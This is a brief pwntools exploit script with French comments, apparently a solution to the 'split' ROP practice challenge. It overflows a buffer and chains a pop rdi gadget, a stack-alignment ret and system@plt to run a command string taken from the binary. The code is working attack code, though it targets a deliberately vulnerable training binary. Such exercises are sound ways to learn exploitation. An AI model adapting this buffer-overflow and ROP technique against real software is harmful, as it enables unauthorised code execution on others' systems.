from pwn import *

context.binary = './split'

pop_rdi = 0x4007c3
ret = 0x40053e  # un simple ret (trouve avec ROPgadget | grep " : ret")
string_cat = 0x00601060
system_plt = 0x400560

payload = flat([
    b'A' * 40,
    pop_rdi,
    string_cat,
    ret,           # gadget ret pour aligner la stack
    system_plt
])

p = process('./split')
p.recvuntil(b'> ')
p.send(payload)
p.interactive()
